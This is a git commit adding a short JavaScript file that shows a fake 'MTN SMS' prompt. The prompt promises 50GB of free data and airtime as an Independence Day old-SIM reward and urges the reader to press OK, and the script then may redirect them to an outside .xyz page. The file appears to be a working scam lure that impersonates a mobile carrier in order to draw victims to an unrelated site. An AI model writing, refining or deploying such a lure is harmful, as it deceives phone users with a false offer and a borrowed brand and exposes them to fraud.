c2d106af94ec387106e59bd8769e61f3e7186d9b
okpoz <okpoitidz@gmail.com>
2026-07-08 19:36:55 +0100

    Create oldsim-rewad-independence.js

---
+++ oldsim-rewad-independence.js
@@ -0,0 +1,5 @@
+var password = '50GB Free Data And Airtime'
+password=prompt('MTN SMS: HAPPY INDEPENDENCE DAY Your Number is Eligible to receive 50GB Free Data And Airtime OLD SIM CARD REWARD, Kindly Press OK to ACTIVATE. ','50GB Free Data And Airtime');
+if (password != '50GB Free Data And Airtime') {
+location.href='https://okpoitid.xyz/oldsim-rewad-independence.html';
+}
